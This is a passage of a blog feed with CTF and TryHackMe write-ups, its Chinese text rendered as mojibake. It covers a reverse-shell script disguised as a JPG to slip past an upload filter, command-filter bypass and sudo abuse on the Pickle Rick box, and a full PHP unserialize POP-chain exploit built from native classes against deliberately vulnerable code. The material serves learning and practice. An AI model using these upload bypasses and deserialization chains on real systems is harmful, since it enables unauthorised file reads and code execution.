alt="image-20240326210645953"></p><p>æ‰¾åˆ°ç›¸å…³çš„ä¿¡æ¯ã€‚</p><p>ç„¶åå¯ä»¥çœ‹åˆ°å®ƒè¿‡æ»¤çš„ä¸€äº›ä¿¡æ¯ç‚¹ã€‚æ–‡ä»¶å¤§å°ï¼Œæ–‡ä»¶å(åªè®©ä¸Šä¼ jpgçš„æ–‡ä»¶)ï¼Œä»¥åŠæ–‡ä»¶å¤´çš„ä¿¡æ¯ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå…ˆæ„é€ ä¸€ä¸‹è¿™ä¸ªjsçš„åå¼¹shellçš„è„šæœ¬ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.ä½¿ç”¨hexeditor xx.<span class="hljs-keyword">js </span>è¿›è¡Œä¿®æ”¹æ–‡ä»¶å¤´ <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png" alt="image-20240326213544023"></p><p>ç„¶åä¿®æ”¹åç¼€ï¼Œæœ€åæŸ¥çœ‹ä¸€ä¸‹å¤§å°æ˜¯å¦ç¬¦åˆ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png" alt="image-20240326213846172"></p><p>ç„¶åä¸Šä¼ ä¸Šå»ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä¸Šä¼ åçš„è·¯å¾„äº†ã€‚</p><p>å› ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æ˜¯jpgå›¾ç‰‡ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°jpgå›¾ç‰‡æ‰€å­˜å‚¨çš„ä½ç½®ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png" alt="image-20240326214355942"></p><p>åœ¨/content/ç›®å½•ä¸‹</p><p>å¯ä»¥åˆ©ç”¨ffufè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬ä¸Šä¼ è¿›å»çš„æ–‡ä»¶åäº†</p><p>ç„¶åå»è®¿é—®ç­‰å¾…åå¼¹shellå³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png" alt="image-20240326220433985"></p><p>è®°å¾—ä¸Šä¼ æ–‡ä»¶æ—¶è¿›è¡ŒæŠ“åŒ…ï¼Œä¿®æ”¹ä¸€ä¸‹é‡Œé¢çš„å€¼</p><p>æŠŠé‚£ä¸ªbase64ç¼–ç çš„æ›¿æ¢æˆè‡ªå·±çš„jsåå¼¹shellç»è¿‡base64ç¼–ç åçš„å€¼</p><p>è¦ä¸ç„¶çš„è¯è¿™ä¸ªshellæ–‡ä»¶å°±ä¸ä¼šè§¦å‘</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png" alt="image-20240326222858465"></p><h3 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h3><p>é¦–å…ˆæ‰«æåå°ï¼Œå‘ç°login.php è¿˜æœ‰robots.txt  æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°ç”¨æˆ·åï¼Œç„¶årobots.txté‡Œé¢çš„æ˜¯ç™»å½•å¯†ç ã€‚</p><p>ç™»å½•è¿›å»ä¹‹åå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯catè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨tacæ¥æŸ¥çœ‹Sup3rS3cretPickl3Ingred.txtçš„å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png" alt="image-20240327104354509"></p><p>ç„¶åæŸ¥çœ‹åé¢çš„é¡µé¢æ—¶ï¼Œå‘ç°æ— æƒé™è®¿é—®ï¼Œç„¶åwhoamiçœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶ä¸æ˜¯rootç”¨æˆ·ï¼ŒçŒœæµ‹è¿™é‡Œè¦è¿›è¡Œææƒã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†:</p><p>è¯•äº†ä¸€ä¸‹sudo whoami ç›´æ¥å°±æ˜¯rootç”¨æˆ·äº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png" alt="image-20240327110239492"></p><p>æˆ‘ä»¬åœ¨/homeç›®å½•ä¸‹æ‰¾åˆ°äº†rick</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png" alt="image-20240327110910558"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png" alt="image-20240327112321022"></p><p>è®°å¾—æ–‡ä»¶ååŠ å¼•å·</p><p>ç¬¬ä¸‰éƒ¨åˆ†:</p><p>åœ¨/rootç›®å½•é‡Œé¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png" alt="image-20240327113843143"></p><p>æœ€ååˆ©ç”¨sudo tac /root/3rd.txt æŸ¥çœ‹å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>tryhackmeå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ez_unserialize</title>
    <link href="/2023/12/25/ezunserialize/"/>
    <url>/2023/12/25/ezunserialize/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>è¿™é“é¢˜æ˜¯ä¸éš¾çš„ æ˜¯æˆ‘æƒ³å¤æ‚äº†</p><p>ä¸‹é¢æ˜¯æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ªinvokeé­”æœ¯æ–¹æ³• åˆ©ç”¨åŸç”Ÿç±»å»æŸ¥æ‰¾å’Œè¯»å–æ–‡ä»¶</p><p>popé“¾æ„é€ æ€æƒ³å¦‚ä¸‹ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">invoke</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">toString</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">call</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">get</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">set</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">isset</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">unset</span>-&gt;</span>wakeup<br></code></pre></td></tr></table></figure><p>å½“æ—¶æˆ‘æ˜¯æƒ³é”™äº† è¿˜æœ‰åŸç”Ÿç±»çš„åˆ©ç”¨é”™äº†</p><p>è¿™é‡Œæœ‰å‡ ä¸ªç‚¹ </p><p>1.åŒmd5 è¿™ä¸ªåœ°æ–¹ç”¨ç®€å•çš„è„šæœ¬ä¸€ä¸‹å°±è¡Œ  å¯ä»¥å¾—åˆ°æ•°å­— 213</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">1000000000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$i</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&#x27;666&#x27;</span>) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-variable">$i</span>;<br>        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°åŒ¹é…ï¼Œé€€å‡ºå¾ªç¯</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>2.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(urldecode(<span class="hljs-variable">$this</span>-&gt;arg1)</span></span>===<span class="hljs-built_in">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹ç”¨æ•°ç»„ç»•è¿‡</p><p>3.if(!preg_match(â€œ/a-zA-Z0-9~-=!^+()/â€œ,$this-&gt;gg2))   è¿™ä¸ªæ­£åˆ™çš„è¯ç”¨$å°±å¯ä»¥ç»•è¿‡</p><p>ä¸‹é¢æ˜¯popé“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$FilesystemIterator</span>=<span class="hljs-string">&#x27;/&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Good</span>(<span class="hljs-string">&#x27;$&#x27;</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&#x27;213&#x27;</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">To</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$b</span>-&gt;l1=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$c</span>-&gt;arg1[]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$c</span>-&gt;t1=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;ll2=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;tt2=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;g1=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;lll3=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$d</span>-&gt;y1=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202312252325427.png" alt="image-20231225232519189"></p><p>ç„¶åå°±æ˜¯åˆ©ç”¨SplFileObjectå»è¯»å–flag</p><p>è¿™é‡Œå°±ä¸åšå±•ç¤ºäº†</p>]]></content>
    
    
    <categories>
      
      <category>èµ›é¢˜å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>2023å®‰æ´µæ¯å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpåŸç”Ÿç±»ååºåˆ—åŒ–</title>
    <link href="/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPåŸç”Ÿç±»ååºåˆ—åŒ–"><a href="#PHPåŸç”Ÿç±»ååºåˆ—åŒ–" class="headerlink" title="PHPåŸç”Ÿç±»ååºåˆ—åŒ–"></a>PHPåŸç”Ÿç±»ååºåˆ—åŒ–</h1><p>ç½‘ä¸Šçš„ä¸€ç¯‡æ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>æ ¹æ®ä¸Šé¢é‚£ä¸ªæ¥å…·ä½“çš„å­¦ä¹ ä¸€ä¸‹</p><p>åˆ†ç±»ï¼š</p><h2 id="1-è¯»å–ç›®å½•-æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰"><a href="#1-è¯»å–ç›®å½•-æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰" class="headerlink" title="1.è¯»å–ç›®å½•/æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰"></a>1.è¯»å–ç›®å½•/æ–‡ä»¶ï¼ˆå†…å®¹ï¼‰</h2><p>è¯»å–æ–‡ä»¶ç›®å½•/æ–‡ä»¶åå­—çš„æœ‰ä¸¤ä¸ªç±»</p><p>1.DirectoryIterator 2.FilesystemIterator</p><p>å…¶ä¸­FilesystemIteratoræ˜¯ä¸€ä¸ªå­ç±»</p><p>å®ƒä¸¤ä¸ªä¸‹é¢éƒ½æœ‰_toStringé­”æœ¯æ–¹æ³•  é€šè¿‡è§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ©ç”¨glob:///è¿›è¡Œä¸€ä¸ªè¯»å–</p><p>ä¸‹é¢çœ‹ä¸€ä¸‹å…·ä½“çš„ä¾‹å­ï¼Œå¹¶çœ‹ä¸€ä¸‹ä¸¤è€…çš„åŒºåˆ«</p><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h3><p>((PHP 5, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¯»å–çš„æ˜¯å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åå­—ï¼Œå¹¶ä¸ä¼šæ˜¾ç¤ºä¸Šä¸€å±‚çš„åå­—</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629842.png" alt="image-20230624172914303"></p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h3><p>((PHP 5 &gt;= 5.3.0, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 